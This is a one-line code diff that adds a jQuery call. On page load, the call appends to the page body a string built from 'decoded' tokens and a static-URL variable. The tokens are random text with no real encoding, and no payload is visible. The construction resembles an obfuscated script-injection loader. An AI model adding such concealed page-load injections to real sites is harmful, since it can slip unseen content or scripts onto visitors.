@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('CBFI') + G_STATIC_URL + decodeURIComponent('6V48RTVY0ZHR8Q8G077OW')); }); 
